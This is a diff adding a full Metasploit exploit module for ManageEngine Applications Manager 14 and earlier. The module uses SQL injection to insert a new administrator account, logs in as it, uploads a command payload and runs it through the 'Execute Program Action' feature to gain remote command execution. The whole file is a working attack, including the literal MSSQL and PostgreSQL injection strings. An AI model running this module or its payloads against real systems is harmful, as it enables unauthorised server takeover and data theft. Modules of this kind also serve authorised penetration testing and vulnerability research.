@@ -1,0 +1,313 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+ 
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+ 
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ManageEngine Applications Manager < 14.0 - Authentication Bypass / Remote Command Execution",
+      'Description'    => %q(
+        This module exploits sqli and command injection vulnerability in the ManageEngine AM 14 and prior versions.
+        It is completely different from the previous EDB-ID:46725 exploit.
+ 
+        Module creates a new admin user with SQLi (MSSQL/PostgreSQL) and provides authentication bypass.
+        Therefore an unauthenticated user can gain the authority of "system" on the server. 
+        It uploads malicious file using the "Execute Program Action(s)" feature of the app with the new admin account.
+ 
+        Tested: Applications Manager 14 on Linux 64-bit (PostgreSQL)
+                Applications Manager 14 on Windows 10 64-bit (MSSQL)
+                Applications Manager 14 on Windows 10 64-bit (PostgreSQL)
+                Applications Manager 13 on Windows Server 2012 R2 64-bit (MSSQL)
+                Applications Manager 12 on Windows Server 2012 R2 64-bit (PostgreSQL)
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module @ehakkus
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'http://pentest.com.tr/exploits/ManageEngine-App-Manager-14-Auth-Bypass-Remote-Command-Execution.html' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'WfsDelay' => 60, # countermeasure
+          'RPORT' => 8443,
+          'SSL' => true
+        },
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+        },
+      'Platform'       => ['unix', 'win', 'linux'],
+      'Targets' =>
+        [
+          [ 'Windows Target',
+            {
+              'Platform' => ['win'],
+              'Arch' => ARCH_CMD,
+            }
+          ],
+          [ 'Linux Target',
+            {
+              'Platform' => ['unix','linux'],
+              'Arch' => ARCH_CMD,
+              'Payload' =>
+                {
+                  'Compat' =>
+                    {
+                      'PayloadType' => 'cmd',
+                      'RequiredCmd' => 'generic perl ruby python',
+                    }
+                }
+            }
+          ]
+        ],
+      'DisclosureDate' => '22 April 2019',
+      'DefaultTarget'  => 1))
+ 
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The path of ME', '/'])
+      ],self.class)
+  end
+ 
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+ 
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def exec(action)
+    # operation of malicious file. The end of the adventure :(
+    send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'common', 'executeScript.do'),
+      'cookie'  => @cookie,
+      'vars_get' => {
+        'method' => 'testAction',
+        'actionID' => action,
+        'haid' => 'null'
+      }
+    )
+  end
+##
+# platform check
+##
+  def check_platform
+    # First touch to support of execute program ;)
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'showTile.do'),
+      'cookie'  => @cookie,
+      'vars_get' => {
+        'TileName' => '.ExecProg',
+        'haid' => 'null',
+      }
+    )
+    if res && res.code == 200 && res.body.include?('createExecProgAction')
+      # Platform can be discovered precisely using an application dir.
+      @dir = res.body.split('name="execProgExecDir" maxlength="200" size="40" value="')[1].split('" class=')[0] # It will be recalled later
+      if @dir =~ /:/
+        platform = Msf::Module::Platform::Windows
+      else 
+        platform = Msf::Module::Platform::Unix
+      end
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred! DIR could not be detected.')
+    end
+    file_up(platform, @dir)
+  end
+##
+# Creating and sending malicious files
+##
+  def file_up(platform, dir)
+    # specifying an extension by platform
+    if platform == Msf::Module::Platform::Windows
+      filex = ".bat"
+    else
+      if payload.encoded =~ /sh/
+        filex = ".sh"
+      elsif payload.encoded =~ /perl/
+        filex = ".pl"
+      elsif payload.encoded =~ /python/
+        filex = ".py"
+      elsif payload.encoded =~ /ruby/
+        filex = ".rb"
+      else
+        fail_with(Failure::Unknown, 'Payload type could not be checked!')
+      end
+    end
+ 
+    @fname= rand_text_alpha(9 + rand(3)) + filex
+    data = Rex::MIME::Message.new
+    data.add_part('./', nil, nil, 'form-data; name="uploadDir"')
+    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"theFile\"; filename=\"#{@fname}\"")
+ 
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data.to_s,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'cookie' => @cookie,
+      'uri' => normalize_uri(target_uri, "Upload.do")     
+    })
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success') # Success icon control
+      print_good("#{@fname} malicious file has been uploaded.")
+      create_exec_prog(dir, @fname) # Great. Let's send them somewhere else o_O
+    else
+      fail_with(Failure::Unknown, 'The file could not be uploaded!')
+    end
+  end
+ 
+  def create_exec_prog(dir, fname)
+ 
+    @display = rand_text_alphanumeric(7)
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     =>  normalize_uri(target_uri.path, 'adminAction.do'),
+      'cookie'  => @cookie,
+      'vars_post' => {
+        'actions' => '/showTile.do?TileName=.ExecProg&haid=null',
+        'method' => 'createExecProgAction',
+        'id' => 0,
+        'displayname' => @display,
+        'serversite' => 'local',
+        'choosehost' => -2,
+        'abortafter' => 5, # I think it would be enough for once. But I gave 5 O_o
+        'command' => fname,
+        'execProgExecDir' => dir,
+        'cancel' => 'false'
+      }
+    )
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success') # Success icon control
+      # Find actionID simply from body res
+      actionid = res.body.split('actionid=')[1].split("','710','350','250','200')")[0] 
+      print_status("Transactions completed. Attempting to get a session...")
+      exec(actionid)
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+ 
+  end
+##
+# Check all
+##
+  def check
+    # Instead of detecting the database type, we can guarantee the vuln by sending a separate query to both.
+    # The platform can be linux and possible remotely connected to the MSSQL database. 
+    # In the same way platform can be windows and postgresql can be used. 
+    # Thats why we are sending two queries. We will check the platform inside.
+    @uname = Rex::Text.rand_text_alpha_lower(6)
+    uid = rand_text_numeric(3)
+    apk = rand_text_numeric(6) 
+    @pwd = rand_text_alphanumeric(8+rand(9))
+    # MSSQL injection should be prepared with ASCII characters. 
+    # Map and join can be used for this.
+    @uidCHR = "#{uid.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @unameCHR = "#{@uname.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @apkCHR = "#{apk.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @adm = "CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)" # "ADMIN" CHARs - should not be random
+    # PostgreSQL injection query // no need APIKEY
+    pg_user ="" 
+    pg_user << "1;insert+into+AM_UserPasswordTable+(userid,username,password)+values+"
+    pg_user << "($$#{uid}$$,$$#{@uname}$$,$$#{Rex::Text.md5(@pwd)}$$);"
+    pg_user << "insert+into+Am_UserGroupTable+(username,groupname)+values+($$#{@uname}$$,$$ADMIN$$);--+"
+    # MSSQL injection query
+    ms_user =""
+    ms_user << "1 INSERT INTO AM_UserPasswordTable(userid,username,password,apikey) values (#{@uidCHR},"
+    ms_user << " #{@unameCHR}, 0x#{Rex::Text.md5(@pwd)}, #{@apkCHR});"
+    ms_user << "INSERT INTO AM_UserGroupTable(username,groupname) values (#{@unameCHR}, #{@adm})--"
+    # Send SQL queries to both types of database(PostreSQL,MSSQL) with SQLi vuln..
+    use_sqli(ms_user, pg_user)
+ 
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+    )
+    # If the user we sent with queries was created, the login will be successful with new admin user.
+    if res && res.code == 200 && res.body.include?('.loginDiv') # css control makes more sense. The application language may not be English.
+      @cookie = res.get_cookies
+      res = send_request_cgi(
+        'method'  => 'POST',
+        'uri'     =>  normalize_uri(target_uri.path, 'j_security_check'),
+        'cookie'  => @cookie,
+        'vars_post' => {
+          'clienttype' => 'html',
+          'j_username' => @uname,
+          'j_password' => @pwd
+        }
+      )
+ 
+      if res && res.code == 302 && res.body.include?('Redirecting to')
+        res = send_request_cgi(
+          'method'  => 'GET',
+          'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+          'cookie'  => @cookie
+          )
+        @cookie = res.get_cookies # last cookie
+        return Exploit::CheckCode::Vulnerable
+      else
+        return Exploit::CheckCode::Safe
+      end
+    else
+      return Exploit::CheckCode::Safe
+    end
+    
+  end
+ 
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    print_good("Excellent! Logged in as #{@uname}")
+    print_status("Admin Username => #{@uname}")
+    print_status("Admin Password => #{@pwd}")
+    check_platform # Start the adventure
+  end
+##
+# Communication with the database
+##
+  def use_sqli(mssql, postgresql)
+    # two different post data must be sent.
+    # Because the query structures are different.
+    send_request_cgi(
+      'method'  => 'POST',
+      'uri'     =>  normalize_uri(target_uri.path, 'jsp', 'FaultTemplateOptions.jsp'),
+      'vars_post' => {
+        'resourceid' => mssql
+      }
+    )
+    # important to send the +/$ characters clear
+    send_request_cgi(
+      {
+      'method' => 'POST',
+      'ctype'  => 'application/x-www-form-urlencoded',
+      'uri' => normalize_uri(target_uri.path, 'jsp', 'FaultTemplateOptions.jsp'),
+      'data' => "resourceid=#{postgresql}"
+      }, 25)
+ 
+  end
+end
+##
+# The end of the codes (o_O) // AkkuS
+##
